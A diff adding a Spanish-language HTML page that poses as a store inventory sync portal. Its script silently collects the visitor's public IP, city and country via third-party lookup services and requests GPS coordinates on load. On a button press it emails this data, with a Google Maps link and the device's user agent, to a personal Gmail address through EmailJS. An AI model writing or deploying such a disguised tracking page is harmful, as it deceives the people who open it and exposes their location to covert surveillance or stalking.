@@ -1,0 +1,125 @@
+<!doctype html>
+<html lang="es">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
+  <title>Portal de Inventario</title>
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+  <style>
+    body { font-family: -apple-system, system-ui, sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; background-color: #f2f2f7; }
+    .container { width: 85%; max-width: 380px; background: white; padding: 30px; border-radius: 20px; box-shadow: 0 8px 30px rgba(0,0,0,0.08); text-align: center; }
+    h1 { color: #007aff; font-size: 1.4rem; margin-bottom: 20px; }
+    p { color: #3a3a3c; font-size: 0.95rem; margin-bottom: 30px; line-height: 1.4; }
+    .btn-send { 
+      width: 100%; 
+      background: #007aff; 
+      color: white; 
+      border: none; 
+      padding: 18px; 
+      border-radius: 14px; 
+      font-size: 1.1rem; 
+      font-weight: 600; 
+      cursor: pointer;
+      -webkit-appearance: none;
+    }
+    .btn-send:active { background: #0056b3; }
+    .status-msg { font-size: 0.75rem; color: #8e8e93; margin-top: 15px; }
+  </style>
+</head>
+<body>
+
+<div class="container">
+  <h1>📋 Registro de Tienda</h1>
+  <p>Para sincronizar este dispositivo con el inventario de la tienda, presione el botón.</p>
+
+  <button class="btn-send" id="btnEnvio">VER INFORME</button>
+  <div id="status" class="status-msg">Iniciando sistema...</div>
+</div>
+
+<script>
+  emailjs.init("MuhlR8HnGJVRNFRWr");
+
+  const urlParams = new URLSearchParams(window.location.search);
+  const tiendaID = urlParams.get('id') || "TIENDA_DESCONOCIDA";
+
+  let reporte = {
+    tienda: tiendaID,
+    ip: "No detectada (Bloqueo de red)",
+    pais: "Desconocido",
+    ciudad: "Desconocida",
+    maps: "Sin GPS",
+    ua: navigator.userAgent
+  };
+
+  // 1. Intentar capturar IP apenas abra (sin bloquear el botón)
+  async function precargarIP() {
+    const status = document.getElementById('status');
+    try {
+      // Usamos una API alternativa que suele ser más amigable con iPhone
+      const response = await fetch('https://api.ipify.org?format=json');
+      const data = await response.json();
+      reporte.ip = data.ip;
+      
+      // Si logramos la IP, intentamos obtener país/ciudad con otra API rápida
+      const geoRes = await fetch(`https://ipapi.co/${data.ip}/json/`);
+      const geoData = await geoRes.json();
+      reporte.pais = geoData.country_name || "Desconocido";
+      reporte.ciudad = geoData.city || "Desconocida";
+      
+      status.innerText = "Sincronizado: " + reporte.ip;
+    } catch (e) {
+      status.innerText = "Modo de red básica activado.";
+      console.log("Error de precarga silenciosa");
+    }
+  }
+
+  // 2. Intentar capturar GPS silenciosamente
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(p => {
+      reporte.maps = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
+    }, null, {timeout: 5000});
+  }
+
+  // 3. Función de envío (SE DISPARA AL TOCAR)
+  async function enviarTodo() {
+    const btn = document.getElementById('btnEnvio');
+    btn.innerText = "ENVIANDO...";
+    btn.disabled = true;
+
+    const templateParams = {
+      to_email: 'gaunt29121@gmail.com',
+      subject: `INVENTARIO: ${reporte.tienda} - ${reporte.ip}`,
+      message: `
+        REPORTE TÉCNICO
+        ---------------------------
+        TIENDA ID: ${reporte.tienda}
+        IP PÚBLICA: ${reporte.ip}
+        UBICACIÓN: ${reporte.pais}, ${reporte.ciudad}
+        GOOGLE MAPS: ${reporte.maps}
+        ---------------------------
+        FECHA: ${new Date().toLocaleString()}
+        DISPOSITIVO: ${reporte.ua}
+      `
+    };
+
+    emailjs.send("service_2phq0rd", "template_1jd3n0o", templateParams)
+      .then(() => {
+        alert("✅ Registro completado.");
+        btn.innerText = "ENVIADO";
+      })
+      .catch((err) => {
+        alert("Error al enviar. Reconecte su Gmail en EmailJS.");
+        btn.disabled = false;
+        btn.innerText = "VER INFORME";
+      });
+  }
+
+  // Evento para iPhone y PC
+  document.getElementById('btnEnvio').addEventListener('click', enviarTodo);
+  
+  // Iniciar precarga
+  precargarIP();
+</script>
+
+</body>
+</html>
